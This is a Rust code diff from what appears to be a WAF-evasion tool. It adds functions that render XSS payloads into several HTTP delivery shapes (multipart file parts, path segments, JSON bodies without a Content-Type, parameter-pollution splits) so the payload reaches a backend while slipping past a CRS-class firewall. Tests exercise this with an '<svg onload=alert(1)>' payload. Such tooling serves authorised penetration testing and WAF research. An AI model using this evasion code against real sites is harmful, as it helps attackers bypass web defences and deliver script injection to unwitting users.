@@ -226,3 +226,200 @@ pub fn equiv_for(class: &str, payload: &str, cfg: &EquivConfig) -> Vec<EquivPayl
         _ => Vec::new(),
     }
 }
+
+// ─────────────────────────────────────────────────────────────────────
+// Delivery-aware public API (the surface scald consumes for XSS).
+//
+// The honest lever for XSS-vs-WAF is NOT payload-string obfuscation
+// (a CRS-class WAF normalises every encoding) — it is DELIVERY SHAPE:
+// the same sound payload delivered via a multipart file part / path
+// segment / JSON-without-Content-Type reaches the backend sink while
+// the WAF inspects it differently. This renders an [`EquivPayload`]'s
+// `(payload × delivery)` into a transport-neutral [`wafrift_types::
+// Request`] that ANY consumer (scald, the proxy, the CLI) can send —
+// one single source of truth for the joint algebra.
+// ─────────────────────────────────────────────────────────────────────
+
+/// Multipart boundary shared by the delivery renderer (kept identical
+/// to the CLI's so behaviour is one source of truth).
+pub const MP_BOUNDARY: &str = "----wafriftEQUIVb0undary";
+
+fn json_escape(s: &str) -> String {
+    let mut o = String::with_capacity(s.len() + 2);
+    for c in s.chars() {
+        match c {
+            '"' => o.push_str("\\\""),
+            '\\' => o.push_str("\\\\"),
+            '\n' => o.push_str("\\n"),
+            '\r' => o.push_str("\\r"),
+            '\t' => o.push_str("\\t"),
+            c if (c as u32) < 0x20 => o.push_str(&format!("\\u{:04x}", c as u32)),
+            c => o.push(c),
+        }
+    }
+    o
+}
+
+fn url_with_pair(target: &str, param: &str, raw_value: &str) -> String {
+    let base = target.trim_end_matches('/');
+    let sep = if base.contains('?') { '&' } else { '?' };
+    format!("{base}{sep}{param}={}", urlencoding::encode(raw_value))
+}
+
+fn url_with_path_segment(target: &str, raw_seg: &str) -> String {
+    let (path, query) = target.split_once('?').map_or((target, ""), |(p, q)| (p, q));
+    let p = path.trim_end_matches('/');
+    let seg = urlencoding::encode(raw_seg);
+    if query.is_empty() {
+        format!("{p}/{seg}")
+    } else {
+        format!("{p}/{seg}?{query}")
+    }
+}
+
+impl DeliveryShape {
+    /// Render this delivery shape + `payload` into a concrete,
+    /// transport-neutral [`wafrift_types::Request`] against `target`.
+    /// Consumers map it to their own HTTP client. This is the ONE
+    /// implementation of the joint `(payload × delivery)` algebra.
+    #[must_use]
+    pub fn to_request(&self, target: &str, payload: &str) -> wafrift_types::Request {
+        use wafrift_types::Request;
+        match self {
+            Self::Query { param } => Request::get(url_with_pair(target, param, payload)),
+            Self::FormBody { param } => {
+                let body = format!("{param}={}", urlencoding::encode(payload));
+                let mut r = Request::post(target.to_string(), body.into_bytes());
+                r.add_header("content-type", "application/x-www-form-urlencoded");
+                r
+            }
+            Self::JsonBody {
+                param,
+                content_type,
+            } => {
+                let body = format!("{{\"{}\":\"{}\"}}", json_escape(param), json_escape(payload));
+                let mut r = Request::post(target.to_string(), body.into_bytes());
+                if let Some(ct) = content_type {
+                    r.add_header("content-type", ct.clone());
+                }
+                r
+            }
+            Self::MultipartField { name } => {
+                let body = format!(
+                    "--{MP_BOUNDARY}\r\nContent-Disposition: form-data; name=\"{name}\"\r\n\r\n{payload}\r\n--{MP_BOUNDARY}--\r\n"
+                );
+                let mut r = Request::post(target.to_string(), body.into_bytes());
+                r.add_header(
+                    "content-type",
+                    format!("multipart/form-data; boundary={MP_BOUNDARY}"),
+                );
+                r
+            }
+            Self::MultipartFile {
+                name,
+                filename,
+                part_ct,
+            } => {
+                let body = format!(
+                    "--{MP_BOUNDARY}\r\nContent-Disposition: form-data; name=\"{name}\"; filename=\"{filename}\"\r\nContent-Type: {part_ct}\r\n\r\n{payload}\r\n--{MP_BOUNDARY}--\r\n"
+                );
+                let mut r = Request::post(target.to_string(), body.into_bytes());
+                r.add_header(
+                    "content-type",
+                    format!("multipart/form-data; boundary={MP_BOUNDARY}"),
+                );
+                r
+            }
+            Self::PathSegment => Request::get(url_with_path_segment(target, payload)),
+            Self::HppSplit { param, parts } => {
+                let decoys = (*parts).max(1);
+                let mut u = target.to_string();
+                for k in 0..decoys {
+                    u = url_with_pair(&u, param, &format!("v{k}"));
+                }
+                Request::get(url_with_pair(&u, param, payload))
+            }
+        }
+    }
+}
+
+/// scald's XSS entrypoint: the sound `(payload × delivery)` XSS
+/// equivalence class for `payload`. Each member still executes the
+/// original script (verified by the generator) AND carries the
+/// delivery shape that slips a WAF — render it with
+/// [`DeliveryShape::to_request`]. Deterministic; `max` members.
+#[must_use]
+pub fn xss_delivered(payload: &str, max: usize) -> Vec<EquivPayload> {
+    let cfg = EquivConfig {
+        max,
+        vary_delivery: true,
+        param: "q".to_string(),
+        ..EquivConfig::default()
+    };
+    xss::generate(payload, &cfg)
+}
+
+#[cfg(test)]
+mod delivery_api_tests {
+    use super::*;
+
+    #[test]
+    fn xss_delivered_is_sound_diverse_and_deterministic() {
+        let atk = "<svg onload=alert(1)>";
+        let a = xss_delivered(atk, 40);
+        let b = xss_delivered(atk, 40);
+        assert_eq!(
+            a.iter().map(|m| &m.payload).collect::<Vec<_>>(),
+            b.iter().map(|m| &m.payload).collect::<Vec<_>>(),
+            "must be deterministic"
+        );
+        assert!(a.len() >= 8, "too few delivered xss members: {}", a.len());
+        // every member still executes the original (generator anti-rig)
+        for m in &a {
+            assert!(
+                xss::still_executes_xss(atk, &m.payload),
+                "UNSOUND delivered member {:?}",
+                m.payload
+            );
+        }
+        // the delivery axis is actually exercised (not all Query)
+        let shapes: std::collections::HashSet<_> =
+            a.iter().map(|m| m.delivery.label()).collect();
+        assert!(
+            shapes.len() >= 3,
+            "delivery axis not varied: {shapes:?}"
+        );
+    }
+
+    #[test]
+    fn to_request_renders_each_shape_faithfully() {
+        let t = "http://h/app";
+        let p = "<svg onload=alert(1)>";
+        let q = DeliveryShape::Query { param: "x".into() }.to_request(t, p);
+        assert!(q.url.contains("x=") && q.url.contains("%3Csvg"));
+        let mf = DeliveryShape::MultipartFile {
+            name: "f".into(),
+            filename: "a.txt".into(),
+            part_ct: "text/plain".into(),
+        }
+        .to_request(t, p);
+        let body = String::from_utf8_lossy(mf.body.as_deref().unwrap_or(&[]));
+        assert!(body.contains("filename=\"a.txt\"") && body.contains(p));
+        assert!(
+            mf.headers
+                .iter()
+                .any(|(k, v)| k == "content-type" && v.contains("multipart/form-data"))
+        );
+        let ps = DeliveryShape::PathSegment.to_request(t, p);
+        assert!(ps.url.starts_with("http://h/app/") && ps.url.contains("%3C"));
+        // JSON-without-Content-Type: the empirically CRS-blind shape.
+        let jb = DeliveryShape::JsonBody {
+            param: "q".into(),
+            content_type: None,
+        }
+        .to_request(t, p);
+        assert!(!jb.headers.iter().any(|(k, _)| k == "content-type"));
+        let jbody = String::from_utf8_lossy(jb.body.as_deref().unwrap_or(&[])).into_owned();
+        assert!(jbody.starts_with("{\"q\":\"") && jbody.contains(p) && jbody.ends_with("\"}"));
+    }
+}
